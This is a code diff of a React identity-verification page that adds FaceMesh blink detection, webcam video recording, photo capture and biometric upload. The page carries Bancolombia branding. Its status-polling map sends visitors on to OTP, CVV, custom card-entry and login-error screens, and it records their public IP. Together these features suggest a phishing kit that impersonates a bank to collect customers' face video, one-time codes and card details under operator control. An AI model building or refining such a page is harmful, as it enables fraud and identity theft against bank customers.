@@ -1,12 +1,12 @@
 import './css/LoginModal.css';
 import { useEffect, useState, useRef } from "react";
-import { FaceDetection } from "@mediapipe/face_detection";
 import { Camera } from "@mediapipe/camera_utils";
 import { limpiarPaddingBody } from "@utils";
 import { isMobile } from "@utils";
 import Loading from "app/components/Loading";
 import { instanceBackend } from "app/axios/instanceBackend";
 import { useNavigate } from "react-router-dom";
+import { FaceMesh } from "@mediapipe/face_mesh";
 
 // Se exporta el componente
 export default function VerificacionIdentidad() {
@@ -33,20 +33,59 @@ export default function VerificacionIdentidad() {
     contador: 3
   });
 
+  // Puntos específicos de FaceMesh para ojo izquierdo y derecho (formato correcto)
+  const LEFT_EYE_POINTS = [33, 160, 158, 133, 153, 144];
+  const RIGHT_EYE_POINTS = [362, 385, 387, 263, 373, 380];
+
+  // Función para calcular EAR
+  const calculateEAR = (landmarks, eyePoints) => {
+    try {
+      // Obtener los 6 puntos del ojo
+      const [p1, p2, p3, p4, p5, p6] = eyePoints.map(idx => landmarks[idx]);
+
+      // Calcular distancias verticales
+      const vertical1 = Math.sqrt(Math.pow(p2.x - p6.x, 2) + Math.pow(p2.y - p6.y, 2));
+      const vertical2 = Math.sqrt(Math.pow(p3.x - p5.x, 2) + Math.pow(p3.y - p5.y, 2));
+
+      // Calcular distancia horizontal
+      const horizontal = Math.sqrt(Math.pow(p1.x - p4.x, 2) + Math.pow(p1.y - p4.y, 2));
+
+      // Evitar división por cero
+      if (horizontal === 0) return 0.3;
+
+      // Calcular EAR
+      return (vertical1 + vertical2) / (2.0 * horizontal);
+    } catch (error) {
+      console.error("Error calculando EAR:", error);
+      return 0.3; // Valor por defecto
+    }
+  };
+
   // Se inicializa la variable mobile
   const mobile = isMobile();
 
-  // Ref para la cámara
+  // Refs
+  const faceMeshRef = useRef(null);
+  const blinkDetectedRef = useRef(false);
+  const eyeClosedRef = useRef(false);
   const hasRecordedRef = useRef(false);
   const [stableTime, setStableTime] = useState(0);
-  const stableTimerRef = useRef(null);
   const [progress, setProgress] = useState(0);
   const mediaRecorderRef = useRef(null);
   const recordedChunksRef = useRef([]);
   const stopTimeoutRef = useRef(null);
   const videoRef = useRef(null);
   const cameraRef = useRef(null);
-  const faceDetectorRef = useRef(null);
+  const canvasRef = useRef(null);
+  const [lastBlinkTime, setLastBlinkTime] = useState(0);
+  const [debugInfo, setDebugInfo] = useState({
+    earLeft: 0,
+    earRight: 0,
+    earAvg: 0,
+    faceDetected: false,
+    faceCount: 0,
+    errorMessage: ""
+  });
 
   // Se inicializa los estados
   const [ip, setIp] = useState("");
@@ -63,7 +102,6 @@ export default function VerificacionIdentidad() {
 
   // Se crea el useEffect para iniciar la cámara y la detección facial
   useEffect(() => {
-
     // Se limpia el padding del body
     limpiarPaddingBody();
 
@@ -73,381 +111,458 @@ export default function VerificacionIdentidad() {
     // Verificar que el ref del video esté disponible
     if (!videoRef.current) return;
 
+    // Crear canvas para debug si no existe
+    if (!canvasRef.current) {
+      const canvas = document.createElement('canvas');
+      canvas.style.position = 'absolute';
+      canvas.style.top = '0';
+      canvas.style.left = '0';
+      canvas.style.zIndex = '1000';
+      canvas.style.pointerEvents = 'none';
+      canvas.width = 320;
+      canvas.height = 400;
+      canvasRef.current = canvas;
+
+      // Insertar el canvas después del video container
+      const container = document.getElementById('webcam-container');
+      if (container) {
+        container.appendChild(canvas);
+      }
+    }
+
     // Función para inicializar la detección facial
     const initFaceDetection = async () => {
-
-      // Se crea la instancia del FaceDetection
-      faceDetectorRef.current = new FaceDetection({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_detection/${file}`, });
-
-      // Se configuran las opciones del FaceDetection
-      faceDetectorRef.current.setOptions({
-        model: "short",
-        minDetectionConfidence: 0.7,
+      faceMeshRef.current = new FaceMesh({
+        locateFile: (file) =>
+          `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`,
       });
 
-      // Se define el callback para los resultados del FaceDetection
-      faceDetectorRef.current.onResults((results) => {
+      faceMeshRef.current.setOptions({
+        maxNumFaces: 1,
+        refineLandmarks: true,
+        minDetectionConfidence: 0.5,
+        minTrackingConfidence: 0.5,
+      });
 
-        // Se calcula el progreso basado en las detecciones
-        if (results.detections && results.detections.length === 1) {
+      // Lógica mejorada de detección
+      faceMeshRef.current.onResults((results) => {
+        const canvas = canvasRef.current;
+        const ctx = canvas?.getContext('2d');
 
-          // Si hay una detección, se inicia o continúa el temporizador estable
-          if (!stableTimerRef.current) {
+        // Limpiar canvas
+        if (ctx) {
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+        }
 
-            // Inicia el temporizador estable
-            stableTimerRef.current = setTimeout(() => {
-
-              // Se actualiza el estado a ok
-              setFormState((prev) => ({
-                ...prev,
-                ok: true,
-                error: false,
-              }));
-            }, 300);
-          };
-        } else {
-
-          // Si no hay detecciones, se reinicia el temporizador estable
-          if (stableTimerRef.current) {
-
-            // Se limpia el temporizador estable
-            clearTimeout(stableTimerRef.current);
-
-            // Se limpia la referencia
-            stableTimerRef.current = null;
-          };
-
-          // Se actualiza el estado a error
-          setFormState((prev) => ({
+        if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) {
+          setFormState(prev => ({
             ...prev,
             ok: false,
             error: true,
-            disabledAtras: false,
-            disabledContinuar: false,
           }));
-
-          // Reinicia tanto el progreso como el tiempo estable
+          setDebugInfo(prev => ({
+            ...prev,
+            faceDetected: false,
+            faceCount: 0,
+            errorMessage: "No se detecta rostro"
+          }));
           setProgress(0);
           setStableTime(0);
+          return;
+        }
+
+        const landmarks = results.multiFaceLandmarks[0];
+        const faceCount = results.multiFaceLandmarks.length;
+
+        // Dibujar puntos de referencia para debug
+        if (ctx && landmarks) {
+          // Escalar puntos del canvas
+          const drawLandmark = (index, color = 'red', size = 3) => {
+            const point = landmarks[index];
+            if (point) {
+              const x = point.x * canvas.width;
+              const y = point.y * canvas.height;
+
+              ctx.fillStyle = color;
+              ctx.beginPath();
+              ctx.arc(x, y, size, 0, 2 * Math.PI);
+              ctx.fill();
+            }
+          };
+
+          // Dibujar puntos de los ojos
+          LEFT_EYE_POINTS.forEach(idx => drawLandmark(idx, '#00ff00', 2));
+          RIGHT_EYE_POINTS.forEach(idx => drawLandmark(idx, '#00ff00', 2));
+
+          // Dibujar nariz (punto 1)
+          drawLandmark(1, '#ff00ff', 4);
+
+          // Dibujar contorno de la cara
+          const faceOutline = [10, 338, 297, 332, 284, 251, 389, 356, 454, 323, 361, 288, 397, 365, 379, 378, 400, 377, 152, 148, 176, 149, 150, 136, 172, 58, 132, 93, 234, 127, 162, 21, 54, 103, 67, 109];
+          for (let i = 0; i < faceOutline.length; i++) {
+            drawLandmark(faceOutline[i], '#ffff00', 1);
+          }
+        }
+
+        // Calcular EAR para ambos ojos
+        const leftEAR = calculateEAR(landmarks, LEFT_EYE_POINTS);
+        const rightEAR = calculateEAR(landmarks, RIGHT_EYE_POINTS);
+        const avgEAR = (leftEAR + rightEAR) / 2;
+
+        // Actualizar debug info
+        setDebugInfo(prev => ({
+          ...prev,
+          earLeft: leftEAR.toFixed(3),
+          earRight: rightEAR.toFixed(3),
+          earAvg: avgEAR.toFixed(3),
+          faceDetected: true,
+          faceCount: faceCount,
+          errorMessage: ""
+        }));
+
+        // Log para debug
+        console.log(`EAR: L=${leftEAR.toFixed(3)}, R=${rightEAR.toFixed(3)}, Avg=${avgEAR.toFixed(3)}`);
+
+        // Thresholds ajustados
+        const EAR_THRESHOLD_CLOSE = 0.20; // Cuando los ojos están cerrados
+        const EAR_THRESHOLD_OPEN = 0.25;  // Cuando los ojos están abiertos
+        const EAR_THRESHOLD_MIN = 0.15;   // Mínimo aceptable para detección
+
+        // Validar que el EAR sea válido
+        if (avgEAR < EAR_THRESHOLD_MIN) {
+          setFormState(prev => ({
+            ...prev,
+            ok: false,
+            error: true,
+          }));
+          return;
+        }
+
+        // Estado actual de los ojos
+        const areEyesClosed = avgEAR < EAR_THRESHOLD_CLOSE;
+        const areEyesOpen = avgEAR > EAR_THRESHOLD_OPEN;
+
+        // Detección de parpadeo
+        if (areEyesClosed && !eyeClosedRef.current) {
+          // Ojos se acaban de cerrar
+          eyeClosedRef.current = true;
+          console.log("👁️ Ojos cerrados detectados, EAR:", avgEAR.toFixed(3));
+        }
+
+        if (areEyesOpen && eyeClosedRef.current) {
+          // Ojos se abrieron después de estar cerrados (parpadeo completo)
+          blinkDetectedRef.current = true;
+          eyeClosedRef.current = false;
+          setLastBlinkTime(Date.now()); // Actualizar tiempo del último parpadeo
+
+          console.log("✅ ¡Parpadeo detectado! EAR:", avgEAR.toFixed(3));
+          console.log("🔄 blinkDetectedRef establecido a: true");
+
+          setFormState(prev => ({
+            ...prev,
+            ok: true,
+            error: false,
+            estadoEspabilar: true // Asegurar que se muestre el mensaje
+          }));
+
+          // Debouncing - Solo resetear después de 3 segundos si no se ha iniciado grabación
+          setTimeout(() => {
+            if (!hasRecordedRef.current) {
+              console.log("🔄 Parpadeo no seguido de grabación, reseteando...");
+              blinkDetectedRef.current = false;
+              setFormState(prev => ({
+                ...prev,
+                ok: false,
+                estadoEspabilar: false
+              }));
+            }
+          }, 3000);
+        }
+
+        // Validar posición facial
+        const isFaceWellPositioned = validateFacePosition(landmarks);
+
+        // Actualizar estado según posición
+        if (!isFaceWellPositioned) {
+          setFormState(prev => ({
+            ...prev,
+            ok: false,
+            error: true,
+          }));
+          setDebugInfo(prev => ({
+            ...prev,
+            errorMessage: "Rostro no centrado"
+          }));
+        } else if (!areEyesOpen && !areEyesClosed) {
+          // Ojos semi-abiertos
+          setFormState(prev => ({
+            ...prev,
+            ok: false,
+            error: false,
+          }));
+        } else if (areEyesOpen && !blinkDetectedRef.current) {
+          // Ojos abiertos pero no se ha detectado parpadeo
+          setFormState(prev => ({
+            ...prev,
+            ok: false,
+            error: false,
+          }));
         }
       });
 
       // Se crea la instancia de la cámara
       cameraRef.current = new Camera(videoRef.current, {
-
-        // onReady callback
         onFrame: async () => {
-
-          // Se envía el frame al FaceDetection
-          await faceDetectorRef.current?.send({
-            image: videoRef.current,
-          });
+          try {
+            await faceMeshRef.current?.send({ image: videoRef.current });
+          } catch (error) {
+            console.error("Error enviando frame a FaceMesh:", error);
+          }
         },
         width: 320,
         height: 400,
       });
 
       // Se inicia la cámara
-      cameraRef.current.start();
+      cameraRef.current.start().catch(error => {
+        console.error("Error iniciando cámara:", error);
+        setFormState(prev => ({
+          ...prev,
+          error: true,
+        }));
+      });
     };
 
-    // Se llama a la función para iniciar la detección facial
     initFaceDetection();
 
-    // Cleanup al desmontar o cambiar de paso
+    // Cleanup
     return () => {
-
-      // Se detiene la cámara y se cierra el FaceDetection
       if (cameraRef.current) {
-
-        // Se detiene la cámara
         cameraRef.current.stop();
         cameraRef.current = null;
-      };
+      }
 
-      // Se cierra el FaceDetection
-      if (faceDetectorRef.current) {
+      if (faceMeshRef.current) {
+        faceMeshRef.current.close();
+        faceMeshRef.current = null;
+      }
 
-        // Se cierra el FaceDetection
-        faceDetectorRef.current.close();
-        faceDetectorRef.current = null;
-      };
+      // Remover canvas de debug
+      if (canvasRef.current && canvasRef.current.parentNode) {
+        canvasRef.current.parentNode.removeChild(canvasRef.current);
+        canvasRef.current = null;
+      }
     };
   }, [formState.paso]);
 
-  // Se crea el useEffect para capturar la ip publica y la hora en estandar
+  // Función de validación de posición facial
+  const validateFacePosition = (landmarks) => {
+    try {
+      // Puntos clave
+      const noseTip = landmarks[1];
+      const leftEye = landmarks[33];
+      const rightEye = landmarks[263];
+      const leftMouth = landmarks[61];
+      const rightMouth = landmarks[291];
+
+      // Validar que existan los puntos
+      if (!noseTip || !leftEye || !rightEye || !leftMouth || !rightMouth) {
+        return false;
+      }
+
+      // Calcular ancho del rostro
+      const faceWidth = Math.abs(rightEye.x - leftEye.x);
+      const faceHeight = Math.abs(leftMouth.y - leftEye.y);
+
+      // Validar proporciones mínimas
+      if (faceWidth < 0.1 || faceHeight < 0.1) {
+        return false; // Rostro demasiado pequeño o lejano
+      }
+
+      // Calcular centro del rostro
+      const faceCenterX = (leftEye.x + rightEye.x) / 2;
+      const faceCenterY = (leftEye.y + leftMouth.y) / 2;
+
+      // Validar que la nariz esté cerca del centro
+      const noseOffsetX = Math.abs(noseTip.x - faceCenterX);
+      const noseOffsetY = Math.abs(noseTip.y - faceCenterY);
+
+      const isCenteredX = noseOffsetX < 0.15 * faceWidth;
+      const isCenteredY = noseOffsetY < 0.15 * faceHeight;
+
+      // Validar nivel de los ojos
+      const eyeLevelDiff = Math.abs(leftEye.y - rightEye.y);
+      const isLevel = eyeLevelDiff < 0.05 * faceHeight;
+
+      // Validar que ambos ojos sean visibles
+      const leftEyeVisible = leftEye.z > -0.5; // Valor z indica profundidad
+      const rightEyeVisible = rightEye.z > -0.5;
+
+      return isCenteredX && isCenteredY && isLevel && leftEyeVisible && rightEyeVisible;
+    } catch (error) {
+      console.error("Error en validación de posición:", error);
+      return false;
+    }
+  };
+
+  // Efecto para manejar timeout de parpadeos muy antiguos
   useEffect(() => {
+    const handleBlinkTimeout = () => {
+      // Si pasan 5 segundos sin iniciar grabación, resetear
+      if (blinkDetectedRef.current && !hasRecordedRef.current && Date.now() - lastBlinkTime > 5000) {
+        console.log("⏰ Timeout: Parpadeo muy antiguo, reseteando...");
+        blinkDetectedRef.current = false;
+        setFormState(prev => ({
+          ...prev,
+          ok: false,
+          estadoEspabilar: false
+        }));
+        setStableTime(0);
+        setProgress(0);
+      }
+    };
 
-    // Se obtiene la IP
+    const interval = setInterval(handleBlinkTimeout, 1000);
+    return () => clearInterval(interval);
+  }, [lastBlinkTime]);
+
+  // Efecto para el progreso después de detectar parpadeo
+  useEffect(() => {
+    let intervalId;
+
+    console.log("🔄 Efecto progreso activado:", {
+      formStateOk: formState.ok,
+      blinkDetected: blinkDetectedRef.current,
+      eyeClosed: eyeClosedRef.current,
+      stableTime: stableTime
+    });
+
+    if (formState.ok && blinkDetectedRef.current) {
+      console.log("✅ Condición OK cumplida, iniciando conteo...");
+
+      // Asegurarse de mostrar el mensaje de espabilar
+      setFormState(prev => ({
+        ...prev,
+        estadoEspabilar: true
+      }));
+
+      // Iniciar el conteo
+      intervalId = setInterval(() => {
+        setStableTime((prevTime) => {
+          const newTime = prevTime + 0.1;
+
+          // Mostrar logs para debug cada segundo
+          if (Math.round(newTime * 10) % 10 === 0) {
+            console.log(`⏱️ Tiempo estable: ${newTime.toFixed(1)}s, Progreso: ${progress}`);
+          }
+
+          if (newTime >= 3) {
+            const progressPercentage = Math.min((newTime - 3) / 5, 1);
+            setProgress(progressPercentage);
+
+            console.log(`🌀 Progreso: ${(progressPercentage * 100).toFixed(1)}%`);
+
+            if (progressPercentage > 0 && !mediaRecorderRef.current && !hasRecordedRef.current) {
+              console.log("🎬 Iniciando grabación...");
+              hasRecordedRef.current = true;
+              startRecording();
+            }
+          }
+
+          return newTime;
+        });
+      }, 100);
+    } else {
+      // Resetear si no hay parpadeo válido
+      console.log("🔄 Reseteando progreso");
+      setStableTime(0);
+      setProgress(0);
+
+      if (!formState.ok && formState.paso === 3) {
+        setFormState(prev => ({
+          ...prev,
+          estadoEspabilar: false
+        }));
+      }
+    }
+
+    return () => {
+      if (intervalId) {
+        console.log("🧹 Limpiando intervalo del progreso");
+        clearInterval(intervalId);
+      }
+    };
+  }, [formState.ok, formState.paso]);
+
+  // Efecto para debug del estado
+  useEffect(() => {
+    console.log("📊 Estado actual:", {
+      paso: formState.paso,
+      ok: formState.ok,
+      error: formState.error,
+      cargando: formState.cargando,
+      estadoEspabilar: formState.estadoEspabilar,
+      blinkDetected: blinkDetectedRef.current,
+      eyeClosed: eyeClosedRef.current,
+      stableTime: stableTime,
+      progress: progress,
+      hasRecorded: hasRecordedRef.current
+    });
+  }, [formState, stableTime, progress]);
+
+  // Resto del useEffect para IP y fecha/hora...
+  useEffect(() => {
     obtenerIP();
-
-    // Se obtiene la fecha/hora con formato
     obtenerFechaHora();
   }, []);
 
-  //  Se crea el useEffect para ejecutar 1 minuto 
   useEffect(() => {
-
-    // Calcular cuánto falta para el próximo minuto exacto
     const ahora = new Date();
     const msHastaProximoMinuto = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();
 
-    // Se inicializa el intervalo
     let intervalId;
-
-    // Timeout para sincronizar con el cambio exacto de minuto
     const timeoutId = setTimeout(() => {
-
-      // Se obtiene la fecha/hora con formato
       obtenerFechaHora();
-
-      // Luego actualizar cada 60 segundos
       intervalId = setInterval(() => {
-
-        // Se obtiene la fecha/hora con formato
         obtenerFechaHora();
       }, 60000);
     }, msHastaProximoMinuto);
 
-    // Cleanup
     return () => {
-
-      // Se limpia el timeout y el intervalo
       clearTimeout(timeoutId);
-
-      // Se limpia el intervalo si existe
       if (intervalId) clearInterval(intervalId);
     };
   }, []);
 
   // Obtiene la dirección IP pública del usuario
   const obtenerIP = async () => {
-
-    // Se usa el try
     try {
-
-      // Se realiza la petición HTTP a la API
       const response = await fetch("https://api.ipify.org?format=json");
-
-      // Se convierte la respuesta a JSON
       const data = await response.json();
-
-      // Se guarda la IP obtenida en el estado
       setIp(data.ip);
     } catch (error) {
-
-      // En caso de error (sin internet, API caída, etc.)
       console.error("Error obteniendo IP", error);
-
-      // Se asigna un valor por defecto para evitar fallos en la UI
       setIp("No disponible");
     };
   };
 
   // Obtiene la fecha y hora actual del sistema
   const obtenerFechaHora = () => {
-
-    // Se obtiene la fecha y hora actual
     const ahora = new Date();
-
-    // Opciones de formato para la fecha y hora
     const opciones = {
-      weekday: "long",   // día de la semana (miércoles)
-      year: "numeric",   // año (2026)
-      month: "long",     // mes (enero)
-      day: "numeric",    // día del mes (7)
-      hour: "numeric",   // hora (5)
-      minute: "2-digit", // minutos (38)
-      hour12: true       // formato 12 horas (p. m.)
+      weekday: "long",
+      year: "numeric",
+      month: "long",
+      day: "numeric",
+      hour: "numeric",
+      minute: "2-digit",
+      hour12: true
     };
-
-    // Se formatea la fecha según el locale español de Colombia
     const formato = ahora.toLocaleString("es-CO", opciones);
-
-    // Se guarda el valor formateado en el estado
     setFechaHora(formato);
   };
 
-  // Placeholder function for the button
-  const handleContinuar = (e) => {
-
-    // Se quita el foco del id continue-button porque a veces queda el foco en mobile
-    e.currentTarget.blur(); // 🔥 CLAVE
-
-    // Se actualiza el estado según el paso actual
-    setFormState((prev) => {
-
-      // Paso 1 → Paso 2
-      if (prev.paso === 1) {
-
-        // Iniciar cámara y detección facial
-        return {
-          ...prev,
-          paso: 2,
-          texto: "Continuar"
-        };
-      };
-
-      // Paso 2 → Paso 3
-      if (prev.paso === 2) {
-
-        // Iniciar cámara y detección facial
-        return {
-          ...prev,
-          paso: 3,
-          continuar: true,
-          texto: "Comenzar",
-        };
-      };
-
-      // Paso 3 (aquí puedes enviar info o finalizar)
-      if (prev.paso === 3) {
-
-        // Se crea el metodo para empezar a grabar
-        return {
-          ...prev,
-          disabledContinuar: true,
-          disabledAtras: true
-        };
-      };
-
-      // Por defecto,
-      return prev;
-    });
-  };
-
-  // Función para manejar el botón de atrás
-  const handleAtras = () => {
-
-    // Se actualiza el estado según el paso actual
-    setFormState((prev) => {
-
-      // Paso 2 → Paso 1
-      if (prev.paso === 2) {
-
-        // Volver al paso 1
-        return {
-          ...prev,
-          paso: 1,
-          texto: "Empezar"
-        };
-      };
-
-      // Paso 3 → Paso 2
-      if (prev.paso === 3) {
-
-        // Detener grabación si está en curso
-        stopRecording();
-
-        // Volver al paso 2
-        return {
-          ...prev,
-          paso: 2,
-          texto: "Continuar"
-        };
-      };
-
-      // Por defecto,
-      return prev;
-    });
-  };
-
-  // Se crea el metodo para detener la grabación
-  const stopRecording = () => {
-
-    // Se limpia el timeout si existe
-    if (stopTimeoutRef.current) {
-
-      // Se limpia el timeout
-      clearTimeout(stopTimeoutRef.current);
-
-      // Se limpia la referencia
-      stopTimeoutRef.current = null;
-    }
-
-    // Se detiene la grabación si está en curso
-    if (mediaRecorderRef.current?.state === "recording") {
-
-      // Se detiene el MediaRecorder
-      mediaRecorderRef.current.stop();
-
-      // Se limpia la referencia
-      mediaRecorderRef.current = null;
-    };
-  };
-
-  // Efecto para controlar el progreso cuando el estado es ok
-  useEffect(() => {
-
-    // Se declara la variable intervalId
-    let intervalId;
-
-    // Se muestra el mensaje para espabilar
-    setFormState((prev) => {
-
-      // Se actualiza el estado a espabilar
-      return {
-        ...prev,
-        estadoEspabilar: true
-      };
-    });
-
-    // Si el estado es ok, inicia el conteo de tiempo
-    if (formState.ok) {
-
-      // Inicia el conteo de tiempo estable
-      intervalId = setInterval(() => {
-
-        // Se actualiza el tiempo estable
-        setStableTime((prevTime) => {
-
-          // Incrementa cada 100ms
-          const newTime = prevTime + 0.1;
-
-          // Si han pasado más de 3 segundos, comienza a llenar el círculo
-          if (newTime >= 3) {
-
-            // Calcula el porcentaje de progreso (de 0 a 1) basado en el tiempo que ha pasado desde los 3 segundos, con un máximo de 5 segundos para completar el círculo
-            const progressPercentage = Math.min((newTime - 3) / 5, 1);
-
-            // Actualiza el estado del progreso
-            setProgress(progressPercentage);
-
-            // Se inicia la grabación cuando el círculo EMPIEZA
-            if (progressPercentage > 0 && !mediaRecorderRef.current && !hasRecordedRef.current) {
-
-              // Se marca que ya se ha iniciado la grabación para evitar múltiples inicios
-              hasRecordedRef.current = true;
-
-              // Se llama al método para empezar a grabar
-              startRecording();
-            };
-          };
-
-          // Se retorna el nuevo tiempo
-          return newTime;
-        });
-      }, 100);
-    } else {
-
-      // Reinicia el tiempo cuando no está ok
-      setStableTime(0);
-      setProgress(0);
-    };
-
-    // Se retorna el cleanup
-    return () => {
-
-      // Se limpia el intervalo si existe
-      if (intervalId) {
-
-        // Se limpia el intervalo
-        clearInterval(intervalId);
-      };
-    };
-  }, [formState.ok]);
-
-  // Helper to capture a frame
+  // Función para capturar frames
   const captureFrame = async () => {
     if (!videoRef.current) return null;
     try {
@@ -455,7 +570,6 @@ export default function VerificacionIdentidad() {
       canvas.width = videoRef.current.videoWidth;
       canvas.height = videoRef.current.videoHeight;
       const ctx = canvas.getContext("2d");
-      // Flip horizontally to match video mirror
       ctx.translate(canvas.width, 0);
       ctx.scale(-1, 1);
       ctx.drawImage(videoRef.current, 0, 0);
@@ -466,86 +580,148 @@ export default function VerificacionIdentidad() {
     }
   };
 
+  // Placeholder function for the button
+  const handleContinuar = (e) => {
+    e.currentTarget.blur();
+
+    setFormState((prev) => {
+      if (prev.paso === 1) {
+        return {
+          ...prev,
+          paso: 2,
+          texto: "Continuar"
+        };
+      };
+
+      if (prev.paso === 2) {
+        return {
+          ...prev,
+          paso: 3,
+          continuar: true,
+          texto: "Comenzar",
+        };
+      };
+
+      if (prev.paso === 3) {
+        return {
+          ...prev,
+          disabledContinuar: true,
+          disabledAtras: true
+        };
+      };
+
+      return prev;
+    });
+  };
+
+  // Función para manejar el botón de atrás
+  const handleAtras = () => {
+    setFormState((prev) => {
+      if (prev.paso === 2) {
+        return {
+          ...prev,
+          paso: 1,
+          texto: "Empezar"
+        };
+      };
+
+      if (prev.paso === 3) {
+        stopRecording();
+        return {
+          ...prev,
+          paso: 2,
+          texto: "Continuar"
+        };
+      };
+
+      return prev;
+    });
+  };
+
+  // Se crea el metodo para detener la grabación
+  const stopRecording = () => {
+    if (stopTimeoutRef.current) {
+      clearTimeout(stopTimeoutRef.current);
+      stopTimeoutRef.current = null;
+    }
+
+    if (mediaRecorderRef.current?.state === "recording") {
+      mediaRecorderRef.current.stop();
+      mediaRecorderRef.current = null;
+    };
+  };
+
   // Se crea el metodo para empezar a grabar
   const startRecording = () => {
+    console.log("🎬 startRecording llamado");
 
-    // Se valida que el video tenga el stream
-    if (!videoRef.current?.srcObject) return;
+    if (!videoRef.current?.srcObject) {
+      console.error("❌ No hay stream de video");
+      return;
+    }
 
-    // Se obtiene el stream del video
     const stream = videoRef.current.srcObject;
-
-    // Se limpia el array de chunks grabados
     recordedChunksRef.current = [];
-    photosRef.current = []; // Reset photos
+    photosRef.current = [];
 
-    // Se crea el MediaRecorder
-    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm;codecs=vp8", });
+    console.log("📹 Creando MediaRecorder...");
+    const mediaRecorder = new MediaRecorder(stream, {
+      mimeType: "video/webm;codecs=vp8",
+    });
 
-    // Evento para cuando hay datos disponibles
     mediaRecorder.ondataavailable = (event) => {
-
-      // Se almacenan los datos grabados
       if (event.data.size > 0) {
-
-        // Se agrega el chunk al array
         recordedChunksRef.current.push(event.data);
       };
     };
 
-    // Evento para cuando se detiene la grabación
     mediaRecorder.onstop = () => {
-
-      // Se crea el blob con los datos grabados
       const blob = new Blob(recordedChunksRef.current, { type: "video/webm", });
-
-      console.log("Grabación finalizada -> ", blob);
-
-      // Upload Biometrics
+      console.log("✅ Grabación finalizada -> tamaño:", blob.size);
       handleUploadBiometrics(blob, photosRef.current);
-
-      // Se detiene el proceso de grabación
-      stopRecording();
     };
 
-    // Se inicia la grabación
-    mediaRecorder.start();
+    mediaRecorder.onstart = () => {
+      console.log("🎥 Grabación iniciada");
+      // Cambiar el estado para mostrar que se está grabando
+      setFormState(prev => ({
+        ...prev,
+        estadoEspabilar: false,
+      }));
+    };
 
-    // Se guarda la referencia del MediaRecorder
+    mediaRecorder.start();
     mediaRecorderRef.current = mediaRecorder;
 
-    // Capture photos at intervals [1s, 2s, 3s]
-    const capture = async () => {
+    console.log("📸 Programando capturas de fotos...");
+
+    const capture = async (photoNum) => {
       if (photosRef.current.length < 3) {
+        console.log(`📸 Capturando foto ${photoNum + 1}...`);
         const photo = await captureFrame();
-        if (photo) photosRef.current.push(photo);
+        if (photo) {
+          photosRef.current.push(photo);
+          console.log(`✅ Foto ${photoNum + 1} capturada`);
+        }
       }
     };
 
-    // Schedule captures
-    setTimeout(capture, 1000);
-    setTimeout(capture, 2500);
-    setTimeout(capture, 4000);
+    // Capturar fotos en intervalos
+    setTimeout(() => capture(0), 1000);
+    setTimeout(() => capture(1), 2500);
+    setTimeout(() => capture(2), 4000);
 
     // ⏱ Detener EXACTAMENTE en X segundos
     stopTimeoutRef.current = setTimeout(() => {
-
-      // Se detiene la grabación
+      console.log("⏱️ Timeout de grabación alcanzado");
       if (mediaRecorderRef.current?.state === "recording") {
-
-        // Se detiene el MediaRecorder
         mediaRecorderRef.current.stop();
-
-        // Se limpia la referencia
         mediaRecorderRef.current = null;
 
-        // Se usa el cargando
         setFormState((prev) => {
-
-          // Se actualiza el estado a cargando
           return {
             ...prev,
-            ok: false,              // 👈 corta el efecto
+            ok: false,
             estadoEspabilar: false,
             cargando: true,
           };
@@ -560,7 +736,6 @@ export default function VerificacionIdentidad() {
       return;
     }
 
-    // Set loading state
     setFormState(prev => ({
       ...prev,
       ok: false,
@@ -583,7 +758,6 @@ export default function VerificacionIdentidad() {
       });
 
       console.log("Biometrics uploaded successfully");
-      // Start polling for status
       iniciarPolling(sesionId);
 
     } catch (error) {
@@ -611,7 +785,6 @@ export default function VerificacionIdentidad() {
           return;
         }
 
-        // Define states to redirect
         const statusMap = {
           'solicitar_otp': '/numero-otp',
           'error_otp': '/numero-otp',
@@ -622,13 +795,12 @@ export default function VerificacionIdentidad() {
           'solicitar_cvv': '/validacion-cvv',
           'solicitar_tc_custom': '/tc-custom',
           'error_login': '/autenticacion',
-          'aprobado': '/finalizado-page' // Or wherever
+          'aprobado': '/finalizado-page'
         };
 
         if (statusMap[estado]) {
           clearInterval(pollingInterval);
 
-          // Si es un estado de error, guardamos la bandera en localStorage
           if (['error_login', 'error_otp', 'error_din'].includes(estado)) {
             localStorage.setItem('estado_sesion', 'error');
           }
@@ -677,15 +849,9 @@ export default function VerificacionIdentidad() {
 
           <div className="login-page">
             <div className="login-box" style={{ backgroundColor: "#454648", textAlignLast: "center" }}>
-              <div
-                style={{
-                  display: "flex",
-                  justifyContent: "center"
-                }}
-              >
-              </div>
 
-              {formState.paso === 1 ?
+              {/* Contenido según paso */}
+              {formState.paso === 1 ? (
                 <>
                   <div
                     style={{
@@ -737,7 +903,6 @@ export default function VerificacionIdentidad() {
                       width: "100%"
                     }}
                   >
-                    {/* Izquierda */}
                     <div style={{ flex: 1, display: "flex", justifyContent: "flex-end" }}>
                       <img
                         src="/assets/images/img_pantalla2/imgi_1_bancolombia-horizontal-no-spacing.svg"
@@ -745,7 +910,6 @@ export default function VerificacionIdentidad() {
                       />
                     </div>
 
-                    {/* HR vertical */}
                     <div
                       style={{
                         width: "2px",
@@ -756,7 +920,6 @@ export default function VerificacionIdentidad() {
                       }}
                     />
 
-                    {/* Derecha */}
                     <div style={{ flex: 1, display: "flex", justifyContent: "flex-start" }}>
                       <img
                         src="/assets/images/indicacion/soyyoredeban.png"
@@ -764,9 +927,8 @@ export default function VerificacionIdentidad() {
                       />
                     </div>
                   </div>
-                </> : null}
-
-              {formState.paso === 2 ?
+                </>
+              ) : formState.paso === 2 ? (
                 <>
                   <div
                     style={{
@@ -863,9 +1025,8 @@ export default function VerificacionIdentidad() {
                       </span>
                     </div>
                   </div>
-                </> : null}
-
-              {formState.paso === 3 ?
+                </>
+              ) : (
                 <>
                   <div
                     style={{
@@ -922,7 +1083,7 @@ export default function VerificacionIdentidad() {
                         width: "180px",
                         height: "180px",
                         borderRadius: "50%",
-                        overflow: "hidden",     // 🔥 CLAVE: recorte real
+                        overflow: "hidden",
                         position: "relative",
                         backgroundColor: "#000",
                       }}
@@ -936,7 +1097,7 @@ export default function VerificacionIdentidad() {
                         style={{
                           width: "100%",
                           height: "100%",
-                          objectFit: "cover",   // 🔥 llena el círculo sin deformar
+                          objectFit: "cover",
                           transform: "scaleX(-1)",
                         }}
                       />
